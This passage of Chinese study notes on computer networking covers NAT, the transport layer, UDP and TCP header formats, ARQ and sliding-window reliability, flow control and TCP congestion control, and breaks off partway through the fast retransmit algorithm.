**解决**：(1) 再申请一些全球 IP 地址。但这在很多情况下是不容易做到的。 (2) **采用网络地址转换 NAT**。这是目前使用得最多的方法，需要在专用网连接到互联网的**路由器**上安装 **NAT 软件**。 

专用网内部的主机使用**本地 IP 地址**又想和互联网上的主机通信时，可以使用 **==NAT 来将本地 IP 转换为全球 IP==**。

**网络地址转换的过程**：内部主机 A 用本地地址 IPA 和互联网上主机 B 通信所发送的数据报必须经过 **NAT 路由器**。 NAT 路由器将数据报的**源地址 IPA 转换成全球地址 IPG**，并把转换结果记录到 **NAT 地址转换表**中，目的地址 IPB 保持不变，然后发送到互联网。 NAT 路由器收到主机 B 发回的数据报时，知道数据报中的源地址是 IPB 而目的地址是 IPG。 根据 NAT 转换表，NAT 路由器将**目的地址 IPG 转换为 IPA**，转发给最终的内部主机 A。 

<img src="assets/image-20191219215435927.png" alt="image-20191219215435927" style="zoom:56%;" />

以前 NAT 将**本地 IP 和全球 IP 一一对应**，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把传输层的==**端口号**==也用上了，使得多个专用网内部的主机**共用一个全球 IP 地址**。使用端口号的 NAT 也叫做网络地址与端口转换 **NAPT**。

<img src="assets/image-20191219215455106.png" alt="image-20191219215455106" style="zoom:50%;" />





### 传输层

#### 传输层概述

##### 1. 进程间通信

**运输层**向它上面的**应用层**提供**通信服务**，它属于面向通信部分的最高层，同时也是用户功能中的最低层。 当网络的**边缘部分**中的两个主机使用**网络的核心部分**的功能进行**端到端的通信**时，只有位于**网络边缘部分**的主机的协议栈才有运输层，而**网络核心部分中的路由器**在**转发分组**时都只用到**下三层**的功能。 

**网络层**只把**分组**发送到**目的主机**，但是真正通信的并不是主机而是主机中的**进程**。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。所以传输层**为==进程==提供通用数据传输服务**。

<img src="assets/1574661864808.png" alt="1574661864808" style="zoom: 56%;" />

**网络层和运输层的区别**：**网络层**是为**主机之间**提供逻辑通信，而**运输层**为**应用进程**之间提供端到端的逻辑通信。

运输层还需要对收到的报文进行**差错检测**。

##### 2. 传输层的两个协议

根据应用程序的不同需求，传输层需要有两种不同的运输协议，即**面向连接的 TCP** 和**无连接的 UDP** 。

- 用户数据报协议 **UDP**（User Datagram Protocol）是**无连接**的，使用的是不可靠信道。尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、**一对多**、多对一和多对多的交互通信。**UDP用户数据报**。
- 传输控制协议 **TCP**（Transmission Control Protocol）是**面向连接**的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是**点对点**的（一对一）。**TCP 报文段**。

<img src="assets/1574665342861.png" alt="1574665342861" style="zoom:50%;" />

**使用 UDP 或 TCP 协议的应用层协议**：

|      应用      |          应用层协议          | 传输层协议  |
| :------------: | :--------------------------: | :---------: |
|    域名系统    |     **DNS**（域名系统）      | **UDP/TCP** |
|    文件传输    |   TFTP（简单文件传送协议）   |     UDP     |
|  路由选择协议  |   **RIP**（路由信息协议）    |   **UDP**   |
|  IP 地址配置   | **DHCP**（动态主机配置协议） |     UDP     |
|    网络管理    |   SNMP（简单网络管理协议）   |     UDP     |
| 远程文件服务器 |   **NFS**（网络文件系统）    |   **UDP**   |
|    IP 电话     |           专用协议           |     UDP     |
| 流式多媒体通信 |           专用协议           |     UDP     |
|      多播      |  **IGMP**（网际组管理协议）  |   **UDP**   |
|    电子邮件    |   SMTP（简单邮件传送协议）   |     TCP     |
|  远程终端接入  |  **TELENT**（远程终端协议）  |     TCP     |
|     万维网     |  **HTTP**（超文本传输协议）  |   **TCP**   |
|    文件传输    |   **FTP**（文件传送协议）    |   **TCP**   |

<img src="assets/1574665371608.png" alt="1574665371608" style="zoom:45%;" />

##### 3. 传输层的端口

端口用一个 16 位**端口号**进行标志，允许 **65535** 个不同端口。 端口号只具有本地意义，即**端口号只是为了标识本计算机应用层中的各进程**。 在互联网中不同计算机的相同端口号是**没有联系**的。两个计算机中的**进程**要互相通信，**不仅必须知道对方的 IP 地址**（为了找到对方的计算机），**而且还要知道对方的端口号**（为 了找到对方计算机中的**应用进程**）。

<img src="assets/1574665407328.png" alt="1574665407328" style="zoom:45%;" />

**端口分为服务器端使用的和客户端使用**的，常用的熟知端口（服务器端）：

<img src="assets/1574663001027.png" alt="1574663001027" style="zoom:50%;" />

<img src="assets/1574665460877.png" alt="1574665460877" style="zoom: 40%;" />



#### 用户数据报协议UDP

##### 1. 概述

**用户数据协议 UDP **是**无连接**的，它在 IP 层的数据报服务上只增加了：复用和分用的功能、差错检测的功能。 

当运输层从 IP 层收到 UDP 数据报时，就根据**首部**中的**目的端口**，把 UDP 数据报通过相应的端口，上交最后的终点：应用进程。 

<img src="assets/1574663612676.png" alt="1574663612676" style="zoom:47%;" />

如果接收方 UDP 发现收到的报文中的目的端口**不正确**（即不存在对应端口的进程），就丢弃该报文，并由**==网际控制报文协议 ICMP==**发送“**端口不可达**”差错报文给发送方！！

**请注意**，虽然在 UDP 之间的通信要用到其端口号，但**由于 UDP 的通信是无连接的，因此==不需要使用套接字==**。 

##### 2. UDP协议的首部格式

用户数据报 UDP 有两个字段：**数据字段和首部字段**。首部字段很简单，只有 **8 个字节**。四个字段的长度都是 2 字节。

- **源端口**：需要对方回信时使用，不需要时可用全 0。
- **目的端口**
- **长度**：UDP 数据报的长度，最小值是仅有首部时的 8。
- **校验和**：检验传输是否出错，出错丢弃。UDP 的校验和是把**首部和数据部分一起校验**。12 字节的伪首部是为了计算检验和临时添加的。

<img src="assets/1574663572580.png" alt="1574663572580" style="zoom:60%;" />

##### 3. UDP协议特点

(1) **UDP 是无连接的**，发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。

(2) **UDP 使用尽最大努力交付，即不保证可靠交付**，因此主机不需要维持复杂的连接状态表。 

(3) **UDP 是面向报文的**。UDP 对应用层交下来的报文，既不合并也不拆分，而是保留这些报文的边界。UDP 一次交付一个完整的报文。 如下图。

<img src="assets/1574663165656.png" alt="1574663165656" style="zoom:52%;" />

(4) **UDP ==没有拥塞控制==**，因此网络出现的拥塞**不会**使源主机的发送速率降低。**这对某些实时应用是很重要的。很适合多媒体通信的要求**。

(5) **UDP 支持一对一、一对多、多对一和多对多的交互通信**。 

(6) **UDP 的首部开销小**，只有 8 个字节，比 TCP 的 20 个字节的首部要短。 



#### 传输控制协议TCP

##### 1. 概述

**传输控制协议TCP**是**面向连接的运输层协议**，**每一条 TCP 连接只能有两个端点** (endpoint)，**每一条 TCP 连接只能是点对点**的（**一对一**）。 TCP 提供**全双工通信**、**面向字节流的可靠交付的服务**（TCP 中的“流”(stream)指的是流入或流出进程的字节序列。 “面向字节流”的含义是：虽然应用程序和 TCP 的交互是一次一个**数据块**，但 TCP 把应用程序交下来的数据看成仅仅是一连串无结构的**字节流**） 如下图。

<img src="assets/1574665638737.png" alt="1574665638737" style="zoom: 45%;" />

**TCP 连接是一条==虚连接==而不是一条真正的物理连接**。

**TCP的连接**：每一条 TCP 连接有 2 个端点，TCP 连接的**端点**叫做**套接字 (socket)** 或插口。 **端口号拼接到 (contatenated with) IP 地**址即构成了**套接字**。

```java
套接字 socket = (IP地址 : 端口号)
```

**每一条 TCP 连接唯一地被通信两端的两个端点（即两个套接字）所确定**。即：

```http
TCP连接 ::= {socket1, socket2} = {(IP1:port1), (IP2:port2)}
```

同一个 **IP 地址**可以有多个**不同的 TCP 连接**，而**同一个端口号**也可以出现在**多个不同的 TCP 连接**中。

TCP 为了实现与 UDP 不同的**可靠传输**。需要一些特定的功能：**停止等待协议**、**连续 ARQ 协议 、滑动窗口协议**（**TCP协议的精髓**）。

##### 2. TCP报文首部格式

TCP 虽然是面向**字节流**的，但 TCP 传送的数据单元却是**报文段**。一个 TCP 报文段分为**首部和数据**两部分，而 TCP 的全部功能都体现在它首部中各字段的作用。TCP 报文作为 **IP 数据报**的数据部分。

TCP 报文段首部的**前 20** 个字节是**固定**的，后面有 4N 字节是根据需要而增加的选项 (N 是整数)。因此 TCP 首部的最小长度是 **20 字节**。

![1574678682438](assets/1574678682438.png)

- **==源端口和目的端口==**：各占 **2 字节**。端口是运输层与应用层的服务接口，运输层的**复用和分用**功能都要通过端口才能实现。 
- **==序号 seq==** ：占 **4 字节**。TCP 连接中传送的数据流中的**每一个字节**都有一个**序号**。序号字段的值则指的是**本报文段**所**发送的**数据的**第一个字节**的序号。 

<img src="assets/1574678876656.png" alt="1574678876656" style="zoom: 40%;" />

- **==确认号 ack==**：占 4 字节，是**==期望==**收到**对方**的**下一个报文段**的数据的**第一个字节**序号。 若确认号 **ack = N**，则表明到序号 **N - 1** 为止的所有数据都**已正确收到**。

- **数据偏移**：即**首部长度**。占 4 位，它指出当前 TCP 报文段的**数据起始处**距离 TCP 报文段的起始处有多远。“数据偏移”的单位是 32 位字（以 4 字节为计算单位）。 
- **保留**：占 6 位，保留为今后使用，但目前应置为 0。
- **紧急 URG**：当 URG = 1 时，表明紧急指针字段**有效**。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。 
- **==确认 ACK 标志位==**：只有当 **ACK = 1** 时**确认号字段才有效**。当 ACK = 0 时，确认号无效。 
- **推送 PSH**：接收 TCP 收到 PSH = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。 
- **复位 RST**：当 RST = 1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。 
- ==**同步 SYN 标志位**==：（**Syn**chronize Sequence Numbers）同步 **SYN = 1** 表示这是一个==**连接请求或连接接受**==报文，在**连接时**用来**同步序号**。   
- **==终止 FIN 标志位==**：用来**释放**一个连接。**FIN = 1** 表明此报文段的**发送端**的数据已**发送完毕**，并**要求释放连接**。 
- **==窗口==**：占 2 字节，是用来**对方设置**发送窗口大小的依据，单位为字节。窗口字段明确指出了现在**允许对方发送**的数据量，窗口值常在**动态**变化着。TCP 根据对方给出**的窗口值**和当前**网络拥塞的程度**来决定一个报文段应**包含多少个字节**（UDP 发送的报文**长度是应用进程给出**的）。TCP 并不关心应用进程一次把多长的报文发送到 TCP 的缓存中，而是根据**对方给出的窗口值**和当前网络拥塞的程序来决定一个报文段应该包含多少个字节。如果缓存的数据块太长可以划分短一些再传送。
- **校验和**：占 2 字节。检验和字段检验的范围包括**首部和数据**这两部分。在计算检验和时，临时在 TCP 报文段的前面加上 12 字节的伪首部。
- **紧急指针字段**：占 16 位，指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。 
- **选项**：长度可变。TCP 最初只规定了一种选项，即**最大报文段长度 MSS**。MSS 告诉对方 TCP：“我的缓存所能接收的报文段的数据字段的最大长度是 MSS 个字节” 。其他选项：窗口扩大选项、时间戳选项、选择确认选项。MSS (Maximum Segment Size) 是 TCP 报文段中的数据字段的最大长度。数据字段加上 TCP 首部才等于整个的 TCP 报文段。所以，MSS 是“TCP 报文段长度减去 TCP 首部长度”。
- **填充**：这是为了使整个首部长度是 **4 字节**的**整数倍**。 



#### TCP可靠传输的工作原理

**IP** **网络**所提供的是**不可靠**的传输，那如何实现可靠传输？主要有 **ARQ协议（停止等待 ARQ  协议、连续 ARQ 协议）、滑动窗口协议**。

==**注意关系**==：ARQ 协议是**自动重传请求**（Automatic Repeat-reQuest）。包含**停止等待 ARQ** （信道利用率低） 和**连续 ARQ**（信道利用率高），**ARQ** 协议实现**连续发送**是**基于滑动窗口协议**的。除此之外滑动窗口还可以用于**流量控制**。

**自动重传请求**（Automatic Repeat-reQuest，ARQ）是 OSI 模型中数据链路层和传输层的错误纠正协议之一。它通过使用**确认和超时**这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。**ARQ 包括停止等待 ARQ 协议和连续 ARQ 协议。**

#### ARQ协议

ARQ 协议的核心就是**自动重传**。

##### 1. 停止等待ARQ协议

停止等待 ARQ 协议要点：

- **停止等待**。发送方每次只发送**一个**分组，在**收到确认**后再发送下一个分组。
- **编号**。对发送的每个分组和确认都进行**编号**。
- **自动重传请求**。发送方为**每个发送的分组**设置一个**超时计时器**。若超时计时器超时，发送方会**自动重传**分组。
- **简单**，但信道利用率太低。

**停止等待协议的要点就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。**

###### (1) 无差错情况

发送方发送分组，接收方在规定时间内收到，并且回复确认。发送方可再次发送分组，这就是无差错的**正常情况**。

<img src="assets/1574665843167.png" alt="1574665843167" style="zoom:45%;" />

###### (2) 出现差错

如果 B 接收 M1 分组后进行**校验**出了差错，就会直接**丢弃 M1**，其他什么也不做，**不通知** A 收到有差错的分组。且如果分组 M1 在**传输过程中丢失**了，接收方 B 也什么都不能做。在这两种情况下，B 都**不会回复**任何信息。但 A 都必须**重发分组**，直到 **B 正确接收**为止，这样才能实现可靠通信。

<img src="assets/1574666056852.png" alt="1574666056852" style="zoom:45%;" />

> **A 如何知道 B 是否正确收到了 M1 分组？**

**解决方法：==超时重传==**

- A 为**每一个已发送的分组**都设置了一个**超时计时器**。
- A 只要在超时计时器**到期**之前收到了相应的**确认**，就**撤销**该超时计时器，继续发送下一个分组 M2 。
- 若 A 在超时计时器规定时间内没有收到 B 的确认，就认为分组错误或丢失，就**重发该分组**。

> 若分组正确到达 B，但 B 回送的确认丢失或延迟了，A 未收到 B 的确认，会**超时重发**。B 可能会收到**重复的 M1** 。B 如何知道收到了重复的分组，需要**丢弃**呢？

**解决方法：==编号==**

- A 为**每一个发送的分组**都进行**编号**。若 B 收到了编号**相同的分组**，则认为收到了重复分组，**丢弃重复的分组**，并**回送确认**。
- B 为发送的确认也进行**编号**，指示该确认是对**哪一个分组的确认**。
- A 根据确认及其编号，可以确定它是对哪一个分组的确认，避免重发发送。若为重复的确认，则将其**丢弃**。

###### (3) 确认丢失

若 B 所发送的对 M1 的**确认信息丢失**了，那么 A 在设定的超时重传时间内不能收到确认，但 A 并**无法知道**：是自己发送的分组出错、丢失了，还是 B 发送的确认丢失了。因此 A 在超时计时器到期后就要**重传** M1。

假定此时 B 又收到了重传的分组 M1。这时 B 应采取**两个行动**：

- 第一，**丢弃这个重复**的分组 M1，不向上层交付。
- 第二，向 A **发送确认**。**不能认为已经发送过确认就不再发送**，因为 A 之所以重传 M1 就表示 A 没有收到对 M1 的确认。

###### (4) 确认迟到

如果传输过程中没有出现差错，但 B 对分组 M1 的**确认迟到**了（如**网络阻塞**等原因）。B 仍然会收到**重复的 M1**，并且同样要**丢弃**重复的 M1，并**重传确认分组**。此时 A 会收到**重复的确认**。对重复的确认的处理很简单：**收下后就丢弃**。

<img src="assets/1574673678140.png" alt="1574673678140" style="zoom:45%;" />

注意：

- 在发送完一个分组后，必须**暂时保留**已发送的分组的**副本**，以备**重发**。
- **分组和确认分组都必须进行编号**。超时计时器的重传时间应当比数据在分组传输的**平均往返**时间**更长一些**。 
- 超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。 

###### (5) 信道利用率

当往返时间 RTT 远大于分组发送时间 TD 时，信道的利用率就会**非常低**。若出现重传，则对传送有用的数据信息来说，信道的利用率就还要降低。

<img src="assets/1574673859032.png" alt="1574673859032" style="zoom:45%;" />

##### 2. 自动请求重传协议

通常发送方最终总是可以收到对所有发出分组的**确认**。如果发送方**不断重传**分组但总是收不到确认，就说明通信**线路太差**，不能进行通信。使用**上述的确认和重传机制，就可以在==不可靠的传输网络上实现可靠的通信==。**像上述的**这种可靠传输协议**常称为==**自动重传请求 ARQ**==  (Automatic Repeat reQuest)。**意思是重传的请求是自动进行的，接收方不需要请求发送方重传某个出错的分组。**

上面的停止等待 ARQ 协议就是自动请求重传协议的一种。

##### 3. **流水线传输**

为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用**流水线传输**。流水线传输就是**发送方可连续发送多个分组**，不必每发完一个分组就停顿下来等待对方的确认。这样可使信道上一直有数据不间断地传送。由于信道上一直有数据不间断地传送，这种传输方式可获得很高的信道利用率。 

<img src="assets/1574674131614.png" alt="1574674131614" style="zoom:45%;" />

这就**演变**出来**连续 ARQ 协议**。

##### 4. 连续ARQ协议

要点：==**自动请求重传(ARQ) + 流水线**==。

连续 ARQ 协议就是在停止等待 ARQ 协议的基础上，发送方一次可以发出**多个分组**。同时使用**滑动窗口协议**控制发送方和接收方所能发送和接收的分组的**数量和编号**。发送方每收到一个确认，就把发送窗口向前滑动。**接收方**一般采用**累积确认**的方式。不必对分组逐个确认，而可以对按序到达的最后一个分组进行确认表示到这个分组为止的所有分组**都已正确**收到了。**超时重传**则采用**回退 N**（Go-Back-N）方法进行。如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对**前两个**分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组**都再重传**一次。这就叫做 Go-back-N（回退 N），表示需要**再退回来重传已发送过的 N 个分组**。

<img src="assets/1574674533053.png" alt="1574674533053" style="zoom:41%;" />

连续 ARQ 协议是**基于滑动窗口协议**的。下面看看滑动窗口协议怎么搞。



#### TCP可靠传输的实现

上一节讲的是实现可靠传输的**基本原理**，这一节具体讲 TCP 是如何实现可靠传输的。分为三个部分。

##### 1. 滑动窗口协议

**滑动窗口协议**在在发送方和接收方之间各自维持一个**滑动窗口**，发送发是**发送窗口**，接收方是**接收窗口**，而且这个窗口是随着时间变化可以向前**滑动**的。它允许发送方**发送多个分组**而不需等待确认，提高了信道的利用率。

###### (1) 基本流程

窗口是**缓存**的一部分，用来暂时存放**字节流**。发送方和接收方各有一个窗口，**接收方**通过 TCP 报文段中的**窗口字段**告诉发送方自己的窗口大小，发送方根据这个值和其它信息**设置自己的窗口大小**。TCP 的滑动窗口是以**字节**为单位的。

**发送窗口**内的字节都**允许被发送**，**接收窗口**内的字节都**允许被接收**。如果发送窗口左部的字节已经发送并且**收到了确认**，那么就将发送窗口向**右滑动**一定距离，直到左部第一个字节不是已发送**并且已确认**的状态；接收窗口的滑动类似，接收窗口左部字节已经发送**确认**并交付主机，就向**右滑动**接收窗口。

- **发送窗口**表示：即使在**没有收到确认**的情况下，也可以**连续把窗口内的数据**全部发送出去。
- **接收窗口**表示：**只允许**接收**落入窗口内**的数据。

<img src="assets/1574684338841.png" alt="1574684338841" style="zoom:53%;" />

发送窗口里面的序号 **31 - 50** 表示是**允许发送**的序号。发送窗口后沿的后面部分表示已经收到**并且确认**，这部分数据不需要继续保存。描述一个发送窗口需要维护==**三个指针**==，如下图所示。下图中如果 **B 收到了 32、33** 序号的数据，但是并**没有收到 31** 的数据，说明数据**没有按序到达**，所以 B 发送的确认报文段中的**确认号**仍然是 **31**（**期望收到**的序号）。

![1574684449907](assets/1574684449907.png)

下图所示为 B **收到** 31-33 的数据并交付主机，同时给 A 确认，其中**窗口值为 20** ，**确认值**变为 **34**（即**下一个期望**收到序号为 34 的数据）。同时下图还收到了 37、38、40 序号的数据，但是**未按序到达**，所以只是**暂存**到接收窗口。此时 B 的**接收窗口向前滑动**到下一个期待接收的位置依然是 34。

<img src="assets/1574684750771.png" alt="1574684750771" style="zoom:55%;" />

此时 A 收到确认号，**发送窗口向前滑动**。

<img src="assets/1574684976697.png" alt="1574684976697" style="zoom:55%;" />

如果 A 的发送窗口内的**序号都已用完**，但还**没有**再收到确认，必须**停止发送**。 如下图。

![1574685045005](assets/1574685045005.png)

而如果 A 收到确认落在发送窗口内，那就可以使发送窗口继续**向前滑动**。

注意：

- 发送端的发送窗口**并不总是**和 B 的接收窗口一样大（因为有一定的**时间滞后**）。
- TCP 标准没有规定对不按序到达的数据应如何处理。通常是先**临时存放在接收窗口**中，等到字节流中所**缺少的字节收到**后，再按序交付上层的应用进程。
- TCP 要求接收方必须有**累积确认**的功能，这样可以减小传输**开销**。 
- 其实真正的发送窗口值的大小还取决于网络的**拥塞情况**，**发送窗口的上限值 = Min (接收方窗口值，拥塞窗口值)**。

###### (2) **滑动窗口与缓存**

**发送缓存**用来暂时存放：发送应用程序传送给发送方 TCP **准备发送**的数据，以及 TCP 已发送出但**尚未收到**确认的数据。

<img src="assets/1574685228063.png" alt="1574685228063" style="zoom:45%;" />

**接收缓存**用来暂时存放：**按序到达**的、但尚未被接收应用程序读取的数据，以及**未按序**到达的数据。 

<img src="assets/1574685240297.png" alt="1574685240297" style="zoom:45%;" />

##### 2. 超时重传时间

**重传机制**是 TCP 中最重要和最复杂的问题之一。TCP 每发送一个报文段，就对这个报文段设置一次**计时器**。只要**计时器**设置的重传时间到但还没有收到确认，就要重传这一报文段。这里重传**时间的选择**就是一个麻烦的问题。如果把超时重传时间设置得**太短**，就会引起很多报文段的不必要的重传，使网络负荷增大。但若把超时重传时间设置得**过长**，则又使网络的空闲时间增大，降低了传输效率。

> **如何设置超时重传时间？**

TCP 采用了一种**自适应算法**，它记录一个报文段发出的时间，以及收到相应的确认的时间。这两个时间之差就是报文段的往返时间 **RTT**。计算**加权平均往返时间 RTTs**。超时重传时间 **RTO** (Retransmission Time-Out) 应**略大于**上面得出的加权平均往返时间 RTTs。

> **如何准确计算 RTTs?**

在计算平均往返时间 RTT 时，只要发生了报文段**重传**事件，就**不采用**其往返时间样本。这样得出的加权平均 RTTs 和 RTO 就比较准确。

##### 3. 选择确认SACK

若收到的报文段无差错，只是**未按序号**，中间还**缺少**一些序号的数据，那么能否设法只传送缺少的数据而不重传已经正确到达接收方的数据？

<img src="assets/1574685707138.png" alt="1574685707138" style="zoom:45%;" />

答案是**可以**的。**选择确认 SACK  (Selective ACK)** 就是一种可行的处理方法。其实**大多数的实现**还是**重传所有**未被确认的数据块。



#### TCP流量控制

##### 1. 概述

**流量控制**就是**控制发送方发送速率**，保证**接收方**来得及接收。**接收方**发送的**确认**报文中的**窗口字段**可以用来**控制发送方窗口值**大小（**利用==滑动窗口==实现流量控制**），从而影响发送方的发送速率。将窗口字段设置为 **0**，则发送方**不能**发送数据。

<img src="assets/1574686102397.png" alt="1574686102397" style="zoom:45%;" />

##### 2. **可能发生死锁**

B 向 A 发送了零窗口的报文段后不久，B 的接收**缓存**又有了一些存储空间。于是 B 向 A 发送了 rwnd = 400 的报文段。
但这个报文段在传送过程中**丢失**了。A 一直等待收到 B 发送的非零窗口的通知，而 B 也一直等待 A 发送的数据。
如果没有其他措施，这种**互相等待的死锁局面**将一直延续下去。为了解决这个问题，TCP 为**每一个连接**设有一个**持续计时器** (persistence timer)。

##### 3. **持续计数器**

只要 TCP 连接的一方收到对方的**零窗口**通知，就**启动该持续计时器**。
若持续计时器设置的时间到期，就发送一个零窗口探测报文段（仅携带 1 字节的数据），而对方就在确认这个探测报文段时给出了现在的窗口值。若窗口仍然是零，则收到这个报文段的一方就重新设置持续计时器。若窗口不是零，则死锁的僵局就可以打破了。



#### TCP拥塞控制

##### 1. 概述

在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的**性能**就要变坏。这种现象称为**拥塞** (congestion)。最坏结果：系统崩溃。

<img src="assets/1574686367422.png" alt="1574686367422" style="zoom:56%;" />

**问题**：增加资源能解决拥塞吗？**不能**。这是因为网络拥塞往往是由**许多因素**引起的，这是一个非常复杂的问题。简单地增加资源在许多情况下不但不能解决拥塞问题，而且还可能使网络的性能更坏。

**拥塞控制**所起的作用：

<img src="assets/1574686661544.png" alt="1574686661544" style="zoom:45%;" />

> **流量控制与拥塞控制的对比**

|                        流量控制                        |                           拥塞控制                           |
| :----------------------------------------------------: | :----------------------------------------------------------: |
| 抑制**发送端发**送数据的速率，以使接收端**来得及接收** | **防止**过多的数据**注入到网络**中，使网络中的路由器或链路**不致过载** |
|      是**点对点**通信量的控制，是**端到端**的问题      | 是一个**全局性**的过程，涉及到与降低网络传输性能有关的所有因素 |
|                  使用**滑动窗口**实现                  | 使用**拥塞窗口**变量 + **拥塞控制算法**实现，还要**配合滑动窗口** |

> **滑动窗口与拥塞窗口的区别**

**滑动窗口**是接收窗口，就是 TCP 头的那个**窗口**，可以理解为一块**内存**，一方面他要接收数据，一方面他要向应用层交付数据。而拥塞窗口是一个**变量**。

##### 2. TCP的拥塞控制方法

**拥塞控制**：基于**拥塞窗口变量+几种拥塞控制算法**实现。

- TCP 采用**基于拥塞窗口**的方法进行拥塞控制，该方法属于闭环控制方法。TCP==**发送方**==维持一个**==拥塞窗口 cwnd==** (Congestion Window) 的变量。**发送端**利用**拥塞窗口**根据网络的拥塞情况**调整发送的数据量**。
- **发送窗口大小**不仅取决于**接收方窗口**（就是 TCP 头部中的窗口值），还取决于网络的**拥塞状况**，所以真正的**发送窗口值**为：

```java
发送窗口的上限值 = Min (接收方窗口值，拥塞窗口值) = Min(rwnd, cwnd)
```

- 当 rwnd < cwnd 时，是**接收方**的接收能力限制发送窗口的**最大值**。
- 当 cwnd < rwnd 时，则是网络的**拥塞限制**发送窗口的**最大值**。 

==发送方让自己的**发送窗口**取为**拥塞窗口和接收方的接受窗口**中**较小的一个**。==

**控制拥塞窗口的原则**：

- 只要网络**没有**出现拥塞，拥塞窗口就可以再**增大**一些，以便把更多的分组发送出去，这样就可以提高网络的利用率。
- 但只要网络**出现**拥塞或有可能出现拥塞，就必须把拥塞窗口**减小**一些，以减少注入到网络中的分组数，以便缓解网络出现的拥塞。

**拥塞的判断**：

<img src="assets/1574686970680.png" alt="1574686970680" style="zoom:40%;" />

##### 3. TCP拥塞控制算法

四种拥塞控制算法（ RFC 5681） ：

- **慢开始** (slow-start)
- **拥塞避免** (congestion avoidance)
- **快重传** (fast retransmit)
- **快恢复** (fast recovery)

TCP 拥塞控制流程图。

<img src="assets/1574688589340.png" alt="1574688589340" style="zoom:40%;" />

###### (1) 慢开始算法

**目的**：用来确定网络的**负载能力**或拥塞程度。

**算法的思路**：由小到大**逐渐**增大拥塞窗口数值。

两个变量：

（1）**拥塞窗口**：**初始**拥塞窗口值。**2 - 4** 个最大报文段，窗口值逐渐增大。

（2）**慢开始门限**（**ssthresh**）：防止拥塞窗口增长过大引起网络拥塞。

**拥塞窗口 cwnd 控制方法**：在每收到一个对**新的报文段的确认**后，可以把拥塞窗口**增加最多一个** **SMSS** 的数值。

<img src="assets/1574687284733.png" alt="1574687284733" style="zoom:40%;" />

每经过一个**传输轮次**，拥塞窗口值就==**加倍**==，即 **==cwnd = cwnd * 2==**。一个传输轮次所经历的时间其实就是**往返时间 RTT**。**“传输轮次”**更加强调：把拥塞窗口 cwnd 所允许发送的报文段**都连续发送**出去，并收到了对**已发送**的**最后一个字节**的确认。
例如拥塞窗口 cwnd = 4，这时的往返时间 RTT 就是发送方**连续发送 4 个报文段**，并收到这全部 **4 个报文段**的确认，总共经历的时间。

**设置慢开始门限状态变量 ssthresh**。**慢开始门限 ssthresh** 的用法如下：

- 当 **cwnd < ssthresh** 时，使用**慢开始**算法。
- 当 **cwnd > ssthresh** 时，停止使用慢开始算法而改用**拥塞避免算法**。
- 当 **cwnd = ssthresh** 时，既可使用慢开始算法，也可使用拥塞避免算法。

###### (2) 拥塞避免算法

当 **==cwnd > ssthresh==** 时，停止使用慢开始算法而改用**拥塞避免算法**。

**思路**：让拥塞窗口 cwnd **缓慢地增大**，避免出现拥塞。**超时之前**，每经过一个**传输轮次**，拥塞窗口 **==cwnd = cwnd + 1==**。这就使拥塞窗口 cwnd 按**线性规律缓慢增长**。在拥塞避免阶段，具有 “**加法增大**” (Additive Increase) 的特点。

<img src="assets/1574687548934.png" alt="1574687548934" style="zoom:40%;" />

当网络**出现拥塞**时：无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（**重传定时器超时**）：

**（1）ssthresh = max (cwnd / 2，2)**：**降低门限值**（**取一半**）。

**（2）cwnd = 1**： 拥塞窗口**重新变为 1**。

**（3）执行慢开始算法**：重新执行**慢开始**。

目的：**迅速**减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组**处理完毕**。 

**慢开始与拥塞避免算法的过程==举例==：**

<img src="assets/1574687664404.png" alt="1574687664404" style="zoom:40%;" />

<img src="assets/1574687681447.png" alt="1574687681447" style="zoom:40%;" />

<img src="assets/1574687709192.png" alt="1574687709192" style="zoom:40%;" />

<img src="assets/1574687785705.png" alt="1574687785705" style="zoom:40%;" />

“拥塞避免”**并非指完全**能够避免了拥塞。利用以上的措施要完全避免网络拥塞还是不可能的。“**拥塞避免**”是说在拥塞避免阶段把拥塞窗口**控制为按线性规律增长**，使网络比较**不容易**出现拥塞。 

<img src="assets/1574687834142.png" alt="1574687834142" style="zoom:40%;" />

<img src="assets/1574687854685.png" alt="1574687854685" style="zoom:40%;" />

<img src="assets/1574687870869.png" alt="1574687870869" style="zoom:40%;" />

###### (3) 快重传算法

**发送方**只要一连收到**三个重复确认**，就知道接收方确实**没有收到**报文段，因而应当**立即进行重传**（即“**快重传**”），这样就**不会出现超时**，发送方也不就会误认为出现了网络拥塞。使用快重传可以使整个网络的**吞吐量**提高约 20%。 不难看出，快重传并非取消重传计时器，而是在某些情况下可以**更早地（更快地）重传**丢失的报文段。 

采用**快重传 FR** (Fast Retransmission) 算法可以让**发送方**尽早知道发生了个别报文段的丢失。快重传算法首先要求接收方**不要等待**自己发送数据时才进行捎带确认，而是要**立即发送确认**，即使收到了**失序**的报文段也要**立即**发出对已收到的报文段的**重复确认**。

下图中**仅仅是丢失了 M3**，其实**并没有发生拥塞**。此时**连续收**到其他三个**重复确认**，就说明其实网络**大概率没有拥塞**，而仅仅是发生了 M3 的丢失。此时启用快重传立即重传 M3。

